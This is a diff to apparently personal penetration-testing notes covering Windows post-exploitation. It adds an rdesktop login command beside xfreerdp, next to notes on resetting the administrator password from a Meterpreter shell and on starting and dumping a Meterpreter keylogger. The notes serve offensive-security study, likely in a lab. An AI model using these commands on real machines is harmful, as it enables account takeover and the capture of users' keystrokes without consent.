@@ -190,7 +190,7 @@
 	- after enabling rdp confirm it via `nmap -p3389 [ip]`
 	- use shell in meterpreter session
 	- `net user administrator [new password]` -- to change the administrator password
-	-  `xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:[IP:PORT]
+	-  `xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:[IP:PORT]` or `rdesktop -u Administrator -d CONTROLLER 10.10.33.104`
 - Windows Keylogging
 	- `keyscan_start` -- start the key logging (it is meterpreter cmd)
 	- `keyscan_dump` - it will dump the keystroke
